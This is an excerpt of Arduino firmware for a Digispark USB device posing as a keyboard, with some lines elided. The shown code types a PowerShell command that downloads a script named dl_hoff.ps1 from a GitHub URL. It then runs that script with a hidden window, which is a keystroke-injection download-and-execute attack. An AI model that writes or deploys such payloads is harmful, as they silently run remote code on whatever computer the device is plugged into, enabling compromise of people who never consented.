...
void loop() {
  ...
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("$client.DownloadFile(\"https://github.com/rmilne/hoffer/raw/master/dl_hoff.ps1\" , \"dl_hoff.ps1\")");
  ...
  //DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //DigiKeyboard.delay(750);
  DigiKeyboard.print("powershell.exe -windowstyle hidden -File %USERPROFILE%\\dl_hoff.ps1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for (;;) {
    /*empty*/
  }
